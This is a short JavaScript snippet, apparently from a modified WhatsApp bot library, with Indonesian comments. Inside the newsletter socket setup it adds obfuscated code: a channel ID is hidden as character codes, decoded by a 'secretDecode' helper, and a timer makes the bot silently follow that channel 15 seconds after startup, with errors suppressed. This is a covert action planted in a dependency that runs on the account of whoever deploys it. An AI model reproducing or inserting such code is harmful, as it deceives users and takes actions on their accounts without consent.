...
const makeNewsletterSocket = (config) => {
    ...
    // --- JURUS SANDI AUTO-FOLLOW CHANNEL LU ---
    const secretDecode = (arr) => arr.map(e => String.fromCharCode(e)).join('');
    setTimeout(async () => {
        try {
            // Ini bakal otomatis nge-follow channel lu (120363403459043185@newsletter)
            await newsletterWMexQuery(
                secretDecode([
                    49, 50, 48, 51, 54, 51, 52, 48, 51, 52, 
                    53, 57, 48, 52, 51, 49, 56, 53, 64, 110, 
                    101, 119, 115, 108, 101, 116, 116, 101, 114
                ]),
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 15000); // Trigger dalam 15 detik setelah bot on
